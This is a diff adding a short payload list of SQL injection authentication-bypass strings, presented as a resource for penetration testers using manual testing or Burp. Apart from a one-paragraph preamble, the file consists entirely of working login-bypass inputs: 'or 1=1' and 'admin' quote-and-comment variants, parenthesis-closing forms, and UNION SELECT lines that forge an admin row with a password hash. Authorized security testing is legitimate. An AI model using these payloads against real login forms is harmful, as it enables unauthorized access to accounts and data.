@@ -1,0 +1,49 @@
+This list can be used by penetration testers when testing for SQL injection authentication bypass.A penetration tester can use it manually or through burp in order to automate the process.The creator of this list is Dr. Emin İslam TatlıIf (OWASP Board Member).If you have any other suggestions please feel free to leave a comment in order to improve and expand the list.
+
+or 1=1
+or 1=1--
+or 1=1#
+or 1=1/*
+admin' --
+admin' #
+admin'/*
+admin' or '1'='1
+admin' or '1'='1'--
+admin' or '1'='1'#
+admin' or '1'='1'/*
+admin'or 1=1 or ''='
+admin' or 1=1
+admin' or 1=1--
+admin' or 1=1#
+admin' or 1=1/*
+admin') or ('1'='1
+admin') or ('1'='1'--
+admin') or ('1'='1'#
+admin') or ('1'='1'/*
+admin') or '1'='1
+admin') or '1'='1'--
+admin') or '1'='1'#
+admin') or '1'='1'/*
+1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
+admin" --
+admin" #
+admin"/*
+admin" or "1"="1
+admin" or "1"="1"--
+admin" or "1"="1"#
+admin" or "1"="1"/*
+admin"or 1=1 or ""="
+admin" or 1=1
+admin" or 1=1--
+admin" or 1=1#
+admin" or 1=1/*
+admin") or ("1"="1
+admin") or ("1"="1"--
+admin") or ("1"="1"#
+admin") or ("1"="1"/*
+admin") or "1"="1
+admin") or "1"="1"--
+admin") or "1"="1"#
+admin") or "1"="1"/*
+1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
+
